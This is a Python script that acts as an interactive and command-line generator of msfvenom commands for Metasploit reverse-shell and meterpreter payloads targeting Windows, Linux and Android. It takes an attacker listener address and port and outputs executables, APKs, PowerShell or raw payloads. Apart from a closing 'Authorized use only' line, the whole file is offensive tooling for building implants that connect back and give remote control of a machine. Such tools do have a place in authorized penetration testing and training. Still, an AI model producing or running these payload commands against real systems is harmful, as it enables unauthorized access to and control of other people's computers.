#!/usr/bin/env python3
"""
Metasploit Payload Command Generator
Safe builder: outputs msfvenom command only.
"""

from __future__ import annotations
import argparse
import re
import sys
from typing import Dict, List


ALLOWED_PAYLOADS: Dict[str, List[str]] = {
    "windows": [
        "windows/x64/meterpreter/reverse_tcp",
        "windows/meterpreter/reverse_tcp",
        "windows/x64/shell_reverse_tcp",
    ],
    "linux": [
        "linux/x64/meterpreter/reverse_tcp",
        "linux/x64/shell_reverse_tcp",
    ],
    "android": [
        "android/meterpreter/reverse_tcp",
    ],
}

ALLOWED_ARCHS = {"x86", "x64", "armle", "aarch64"}
ALLOWED_FORMATS = {"exe", "elf", "raw", "apk", "psh", "python"}
IP_REGEX = re.compile(r"^(?:\d{1,3}\.){3}\d{1,3}$")


def validate_ip(ip: str) -> None:
    if not IP_REGEX.match(ip):
        raise ValueError("Invalid LHOST format")
    if any(int(o) > 255 for o in ip.split(".")):
        raise ValueError("Invalid LHOST value")


def validate_port(port: int) -> None:
    if not (1 <= port <= 65535):
        raise ValueError("Invalid LPORT range")


def validate_payload(platform: str, payload: str) -> None:
    if payload not in ALLOWED_PAYLOADS[platform]:
        raise ValueError("Payload not allowed for selected platform")


def build_command(p, a, h, l, f, o) -> str:
    return (
        "msfvenom "
        f"-p {p} ARCH={a} LHOST={h} LPORT={l} "
        f"-f {f} -o {o}"
    )


def interactive_mode():
    print("\n[ Interactive Metasploit Payload Builder ]\n")

    platform = input(f"Platform {list(ALLOWED_PAYLOADS)}: ").strip()
    payloads = ALLOWED_PAYLOADS.get(platform)
    if not payloads:
        raise ValueError("Invalid platform")

    print("\nAvailable payloads:")
    for p in payloads:
        print(f" - {p}")
    payload = input("\nPayload: ").strip()

    arch = input(f"Architecture {list(ALLOWED_ARCHS)}: ").strip()
    lhost = input("LHOST: ").strip()
    lport = int(input("LPORT: ").strip())
    fmt = input(f"Format {list(ALLOWED_FORMATS)}: ").strip()
    output = input("Output file: ").strip()

    validate_payload(platform, payload)
    validate_ip(lhost)
    validate_port(lport)

    return build_command(payload, arch, lhost, lport, fmt, output)


def cli_mode():
    parser = argparse.ArgumentParser()
    parser.add_argument("--platform", choices=ALLOWED_PAYLOADS.keys())
    parser.add_argument("--payload")
    parser.add_argument("--arch", choices=ALLOWED_ARCHS)
    parser.add_argument("--lhost")
    parser.add_argument("--lport", type=int)
    parser.add_argument("--format", choices=ALLOWED_FORMATS)
    parser.add_argument("--output")
    parser.add_argument("--interactive", action="store_true")
    return parser.parse_args()


def main():
    try:
        args = cli_mode()

        if args.interactive:
            cmd = interactive_mode()
        else:
            missing = [
                k for k in (
                    args.platform, args.payload, args.arch,
                    args.lhost, args.lport, args.format, args.output
                ) if k is None
            ]
            if missing:
                raise ValueError("Missing required arguments (or use --interactive)")

            validate_payload(args.platform, args.payload)
            validate_ip(args.lhost)
            validate_port(args.lport)

            cmd = build_command(
                args.payload,
                args.arch,
                args.lhost,
                args.lport,
                args.format,
                args.output,
            )

        print("\nGenerated Payload Command:\n")
        print(cmd)
        print("\nAuthorized use only.")

    except Exception as e:
        print(f"Error: {e}", file=sys.stderr)
        sys.exit(1)


if __name__ == "__main__":
    main()
